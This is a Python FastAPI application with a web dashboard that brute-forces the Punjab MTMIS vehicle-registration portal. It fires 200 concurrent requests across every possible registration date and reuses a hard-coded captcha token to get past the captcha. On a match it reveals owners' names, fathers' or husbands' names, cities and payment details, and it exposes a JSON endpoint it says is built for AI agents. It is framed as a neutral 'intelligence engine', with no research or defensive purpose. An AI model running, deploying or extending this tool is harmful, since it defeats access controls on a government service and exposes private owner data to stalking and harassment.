import asyncio
import aiohttp
import json
from datetime import datetime, timedelta
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, StreamingResponse

app = FastAPI(
    title="MTMIS Vehicle Intelligence Engine",
    description="High-throughput permutation vehicle verification engine for AI agents and web interfaces."
)

TARGET_URL = "https://mtmis.excise.punjab.gov.pk/gtw/Public/Mtmis/GetVehicleInfoByRegNoAndDate"
CONCURRENCY_LIMIT = 200  # Concurrency limit for scanning bursts

# Static verification tokens
STATIC_CAPTCHA_INPUT = "278982"
STATIC_CAPTCHA_TOKEN = "0UDCfjFTbNP1Fi67bMthwzfj94kAGsX5894hGC3j_j4XqiuuthU8tRyNXFjdvhQpYLHqC3753hdHrBPmb5_cVQ"
STATIC_CAPTCHA_TEXT = "neBwwveeyD8ZeE5mPcfUFg"

def generate_date_permutations(start_year: int):
    dates = []
    start_date = datetime(start_year, 1, 1)
    end_date = datetime.now()
    
    curr = start_date
    while curr <= end_date:
        dates.append(curr.strftime("%Y-%m-%d"))
        curr += timedelta(days=1)
    return dates

async def test_date(session, reg_no: str, date_str: str, semaphore: asyncio.Semaphore):
    async with semaphore:
        data = aiohttp.FormData()
        data.add_field('registrationNo', reg_no)
        data.add_field('registrationDate', date_str)
        data.add_field('dntCaptchaInputText', STATIC_CAPTCHA_INPUT)
        data.add_field('dntCaptchaToken', STATIC_CAPTCHA_TOKEN)
        data.add_field('dntCaptchaText', STATIC_CAPTCHA_TEXT)

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://mtmis.excise.punjab.gov.pk",
            "Referer": "https://mtmis.excise.punjab.gov.pk/"
        }

        try:
            async with session.post(TARGET_URL, data=data, headers=headers, timeout=5) as response:
                if response.status == 200:
                    text = await response.text()
                    if "Vehicle data found" in text or "success" in text.lower():
                        return date_str, text
        except Exception:
            pass
        return None

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTMIS Punjab - Vehicle Registration Intelligence Engine</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; }
        .font-mono { font-family: 'JetBrains Mono', monospace; }
    </style>
</head>
<body class="bg-slate-50 text-slate-900 min-h-screen flex flex-col antialiased selection:bg-slate-900 selection:text-white">
    <header class="border-b border-slate-200 bg-white/80 backdrop-blur-md sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
            <div class="flex items-center space-x-3">
                <div class="w-9 h-9 bg-slate-900 rounded-xl flex items-center justify-center text-white font-bold text-sm tracking-tight shadow-sm">
                    EX
                </div>
                <div>
                    <span class="font-bold text-slate-900 tracking-tight text-base">MTMIS Punjab</span>
                    <span class="text-xs text-slate-500 block font-medium">High-Throughput Intelligence Engine</span>
                </div>
            </div>
            <div class="flex items-center space-x-3">
                <span class="inline-flex items-center px-3 py-1.5 rounded-full text-xs font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200 shadow-2xs">
                    <span class="w-2 h-2 mr-2 bg-emerald-500 rounded-full animate-pulse"></span>
                    200 Req/s Engine Active
                </span>
            </div>
        </div>
    </header>

    <main class="flex-grow max-w-7xl mx-auto px-6 py-10 w-full grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-5 space-y-6">
            <div class="border border-slate-200/80 rounded-2xl p-6 bg-white shadow-xs space-y-5">
                <div>
                    <h2 class="text-lg font-bold text-slate-900 tracking-tight">Search Parameters</h2>
                    <p class="text-xs text-slate-500 mt-1 leading-relaxed">Enter license plate credentials to initiate asynchronous 200 req/s date permutation scan.</p>
                </div>
                
                <div class="space-y-4">
                    <div>
                        <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-2">License Plate Number</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2"/></svg>
                            </span>
                            <input type="text" id="regNo" value="LDK-13-9900" class="w-full pl-10 pr-3.5 py-3 bg-slate-50/50 border border-slate-200 rounded-xl text-sm font-mono uppercase font-semibold focus:outline-none focus:ring-2 focus:ring-slate-900 focus:bg-white transition-all">
                        </div>
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-2">Vehicle Start Year</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
                            </span>
                            <input type="number" id="startYear" value="2013" class="w-full pl-10 pr-3.5 py-3 bg-slate-50/50 border border-slate-200 rounded-xl text-sm font-mono font-semibold focus:outline-none focus:ring-2 focus:ring-slate-900 focus:bg-white transition-all">
                        </div>
                    </div>
                </div>

                <div class="pt-2 flex space-x-3">
                    <button onclick="startScan()" id="scanBtn" class="flex-1 bg-slate-900 hover:bg-slate-800 text-white font-semibold py-3.5 rounded-xl text-sm transition-all shadow-sm flex items-center justify-center space-x-2">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
                        <span>Start High-Speed Scan</span>
                    </button>
                    <button onclick="stopScan()" id="stopBtn" disabled class="bg-slate-100 hover:bg-slate-200 text-slate-400 hover:text-slate-600 font-semibold py-3.5 px-4 rounded-xl text-sm transition-all disabled:opacity-40 disabled:pointer-events-none">
                        Stop
                    </button>
                </div>
            </div>

            <div class="border border-slate-200/80 rounded-2xl p-6 bg-white shadow-xs space-y-4">
                <div class="flex items-center justify-between">
                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider">Telemetry & Status</h3>
                    <span id="statStatus" class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-bold bg-slate-100 text-slate-700">Idle</span>
                </div>

                <div class="grid grid-cols-2 gap-4 pt-1">
                    <div class="bg-slate-50 p-3.5 rounded-xl border border-slate-100">
                        <span class="text-xs text-slate-500 font-medium block">Tested Dates</span>
                        <span id="statTested" class="text-lg font-mono font-bold text-slate-900 mt-0.5 block">0</span>
                    </div>
                    <div class="bg-slate-50 p-3.5 rounded-xl border border-slate-100">
                        <span class="text-xs text-slate-500 font-medium block">Time Elapsed</span>
                        <span id="statTimer" class="text-lg font-mono font-bold text-slate-900 mt-0.5 block">0.0s</span>
                    </div>
                    <div class="bg-slate-50 p-3.5 rounded-xl border border-slate-100 col-span-2">
                        <div class="flex justify-between items-center">
                            <span class="text-xs text-slate-500 font-medium">Total Time Taken</span>
                            <span id="statTotalTime" class="text-sm font-mono font-bold text-emerald-600">-</span>
                        </div>
                    </div>
                </div>

                <div id="liveTickerContainer" class="pt-3 border-t border-slate-100 hidden">
                    <div class="flex items-center justify-between bg-slate-900 text-white p-3 rounded-xl">
                        <div class="flex items-center space-x-2.5 text-xs">
                            <span class="w-2.5 h-2.5 bg-emerald-400 rounded-full animate-ping"></span>
                            <span class="font-medium text-slate-300">Testing Date:</span>
                            <span id="currentTestDate" class="font-mono font-bold text-emerald-400 text-sm">--</span>
                        </div>
                        <span class="text-[10px] font-mono tracking-wider text-slate-400 uppercase">200 Req/s</span>
                    </div>
                </div>
            </div>
        </div>

        <div class="lg:col-span-7 space-y-6">
            <div id="resultsContainer" class="border border-slate-200/80 rounded-2xl bg-white shadow-xs overflow-hidden hidden">
                <div class="bg-slate-900 px-6 py-4 text-white flex justify-between items-center">
                    <div class="flex items-center space-x-3">
                        <div class="w-8 h-8 rounded-lg bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-bold">
                            ✓
                        </div>
                        <div>
                            <h3 class="text-sm font-bold">Vehicle Record Verified</h3>
                            <span id="matchedDateLabel" class="text-xs font-mono text-emerald-400 font-medium"></span>
                        </div>
                    </div>
                    <span class="px-2.5 py-1 bg-emerald-500 text-white rounded-lg text-xs font-bold uppercase tracking-wider">HTTP 200 OK</span>
                </div>
                
                <div class="p-6 space-y-6">
                    <div>
                        <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-3 flex items-center space-x-2">
                            <span>Vehicle Details</span>
                        </h4>
                        <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 bg-slate-50/70 p-4 rounded-xl border border-slate-100">
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Registration No</span>
                                <span id="resRegNo" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Manufacturing Year</span>
                                <span id="resMfgYear" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Maker / Model</span>
                                <span id="resMaker" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Engine No</span>
                                <span id="resEngineNo" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Color</span>
                                <span id="resColor" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Tax Paid Upto</span>
                                <span id="resTax" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                        </div>
                    </div>

                    <div>
                        <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-3">Owner Details</h4>
                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 bg-slate-50/70 p-4 rounded-xl border border-slate-100">
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Owner Name</span>
                                <span id="resOwnerName" class="text-sm font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Father / Husband Name</span>
                                <span id="resFatherName" class="text-sm font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">City</span>
                                <span id="resCity" class="text-sm font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                        </div>
                    </div>

                    <div>
                        <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-3">Challan & Application Status</h4>
                        <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 bg-slate-50/70 p-4 rounded-xl border border-slate-100">
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Process</span>
                                <span id="resProcess" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Application Status</span>
                                <span id="resAppStatus" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Amount Paid</span>
                                <span id="resAmountPaid" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                            <div>
                                <span class="text-xs text-slate-500 font-medium block">Paid On</span>
                                <span id="resPaidOn" class="text-sm font-mono font-bold text-slate-900 mt-0.5 block">-</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="emptyState" class="border border-slate-200/80 rounded-2xl p-16 bg-white shadow-xs text-center space-y-4">
                <div class="w-16 h-16 bg-slate-100 text-slate-400 rounded-2xl flex items-center justify-center mx-auto shadow-2xs">
                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
                </div>
                <div>
                    <h3 class="text-base font-bold text-slate-900">Awaiting Search Query</h3>
                    <p class="text-xs text-slate-500 max-w-sm mx-auto mt-1 leading-relaxed">Enter license plate credentials and click start to run 200 req/s verification scan across all dates.</p>
                </div>
            </div>
        </div>
    </main>

    <footer class="border-t border-slate-200 py-6 text-center text-xs text-slate-500 mt-auto bg-white">
        MTMIS Punjab Vehicle Verification Engine &bull; Secure Protocol
    </footer>

    <script>
        let eventSource = null;
        let timerInterval = null;
        let startTime = null;

        function startScan() {
            const regNo = document.getElementById('regNo').value.trim();
            const startYear = document.getElementById('startYear').value.trim();
            const resultContainer = document.getElementById('resultsContainer');
            const emptyState = document.getElementById('emptyState');
            const tickerContainer = document.getElementById('liveTickerContainer');
            
            resultContainer.classList.add('hidden');
            emptyState.classList.add('hidden');
            tickerContainer.classList.remove('hidden');

            document.getElementById('scanBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            
            const statStatus = document.getElementById('statStatus');
            statStatus.textContent = 'Running (200 req/s)';
            statStatus.className = 'inline-flex items-center px-2.5 py-1 rounded-full text-xs font-bold bg-emerald-50 text-emerald-700 border border-emerald-200';
            
            document.getElementById('statTotalTime').textContent = '-';

            startTime = performance.now();
            if (timerInterval) clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                const elapsed = ((performance.now() - startTime) / 1000).toFixed(1);
                document.getElementById('statTimer').textContent = `${elapsed}s`;
            }, 100);

            if (eventSource) eventSource.close();

            eventSource = new EventSource(`/scan-stream?reg_no=${encodeURIComponent(regNo)}&start_year=${startYear}`);

            eventSource.onmessage = function(e) {
                const data = JSON.parse(e.data);

                if (data.type === 'success') {
                    const elapsedFinal = ((performance.now() - startTime) / 1000).toFixed(2);
                    clearInterval(timerInterval);
                    document.getElementById('statTotalTime').textContent = `${elapsedFinal}s`;
                    document.getElementById('matchedDateLabel').textContent = `Verified Date: ${data.date}`;
                    document.getElementById('currentTestDate').textContent = `Matched (${data.date})`;
                    
                    try {
                        const parsed = JSON.parse(data.payload);
                        const v = parsed.data.vehicle;
                        const o = parsed.data.owner;
                        const c = parsed.data.challan;

                        document.getElementById('resRegNo').textContent = v.registrationNo || '-';
                        document.getElementById('resMfgYear').textContent = v.manufacturingYear || '-';
                        document.getElementById('resMaker').textContent = v.vehicleMaker || '-';
                        document.getElementById('resEngineNo').textContent = v.engineNo || '-';
                        document.getElementById('resColor').textContent = v.vehicleColor || '-';
                        document.getElementById('resTax').textContent = v.taxPaidUpto || '-';

                        document.getElementById('resOwnerName').textContent = o.ownerName || '-';
                        document.getElementById('resFatherName').textContent = o.fatherHusbandName || '-';
                        document.getElementById('resCity').textContent = o.city || '-';

                        document.getElementById('resProcess').textContent = c.businessProcess || '-';
                        document.getElementById('resAppStatus').textContent = c.applicationStatus || '-';
                        document.getElementById('resAmountPaid').textContent = c.amountPaid || '-';
                        document.getElementById('resPaidOn').textContent = c.paidOn || '-';

                        resultContainer.classList.remove('hidden');
                    } catch (err) {
                        console.error("Failed parsing payload", err);
                    }

                    statStatus.textContent = 'Completed';
                    statStatus.className = 'inline-flex items-center px-2.5 py-1 rounded-full text-xs font-bold bg-emerald-50 text-emerald-700 border border-emerald-200';
                    stopScan();
                } else if (data.type === 'error') {
                    clearInterval(timerInterval);
                    const elapsedFinal = ((performance.now() - startTime) / 1000).toFixed(2);
                    document.getElementById('statTotalTime').textContent = `${elapsedFinal}s`;
                    statStatus.textContent = 'No Match';
                    statStatus.className = 'inline-flex items-center px-2.5 py-1 rounded-full text-xs font-bold bg-rose-50 text-rose-700 border border-rose-200';
                    emptyState.classList.remove('hidden');
                    stopScan();
                } else {
                    if (data.tested_count) {
                        document.getElementById('statTested').textContent = data.tested_count;
                    }
                    if (data.current_date) {
                        document.getElementById('currentTestDate').textContent = data.current_date;
                    }
                }
            };

            eventSource.onerror = function() {
                stopScan();
            };
        }

        function stopScan() {
            if (eventSource) {
                eventSource.close();
                eventSource = null;
            }
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            document.getElementById('scanBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            document.getElementById('liveTickerContainer').classList.add('hidden');
        }
    </script>
</body>
</html>
"""

@app.get("/health")
async def health_check():
    """Health check endpoint for container orchestrators and Render."""
    return {"status": "ok", "service": "mtmis-engine"}

@app.get("/", response_class=HTMLResponse)
async def index():
    """Serves the front-end dashboard."""
    return HTML_PAGE

@app.get("/scan-stream")
async def scan_stream(reg_no: str, start_year: int):
    """Server-Sent Events endpoint for the live browser UI."""
    async def event_generator():
        dates = generate_date_permutations(start_year)
        yield f"data: {json.dumps({'msg': f'[*] Generated {len(dates)} dates. Dispatching 200 concurrency burst...', 'type': 'info'})}\n\n"
        
        semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
        connector = aiohttp.TCPConnector(
            limit=CONCURRENCY_LIMIT,
            limit_per_host=CONCURRENCY_LIMIT,
            force_close=False,
            enable_cleanup_closed=True
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            batch_size = 200
            tested_count = 0
            for i in range(0, len(dates), batch_size):
                batch = dates[i:i + batch_size]
                tasks = [test_date(session, reg_no, d, semaphore) for d in batch]
                
                results = await asyncio.gather(*tasks)
                for res in results:
                    tested_count += 1
                    if res:
                        date_found, response_text = res
                        yield f"data: {json.dumps({'type': 'success', 'date': date_found, 'payload': response_text, 'tested_count': tested_count})}\n\n"
                        return

                yield f"data: {json.dumps({'type': 'progress', 'current_date': batch[-1], 'tested_count': tested_count})}\n\n"
                await asyncio.sleep(0.01)

        yield f"data: {json.dumps({'type': 'error'})}\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")

@app.get("/api/vehicle")
async def get_vehicle_json(reg_no: str, start_year: int = 2013):
    """Direct JSON API endpoint specifically designed for AI agents (Claude, Gemini, etc.)."""
    dates = generate_date_permutations(start_year)
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    connector = aiohttp.TCPConnector(
        limit=CONCURRENCY_LIMIT,
        limit_per_host=CONCURRENCY_LIMIT,
        force_close=False,
        enable_cleanup_closed=True
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        batch_size = 200
        for i in range(0, len(dates), batch_size):
            batch = dates[i:i + batch_size]
            tasks = [test_date(session, reg_no, d, semaphore) for d in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res:
                    date_found, response_text = res
                    try:
                        parsed_payload = json.loads(response_text)
                    except Exception:
                        parsed_payload = {"raw": response_text}
                        
                    return {
                        "status": "success",
                        "registration_no": reg_no,
                        "verified_date": date_found,
                        "vehicle_data": parsed_payload
                    }
                    
    return {
        "status": "not_found",
        "registration_no": reg_no,
        "message": f"No vehicle records found scanning from {start_year} to present."
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)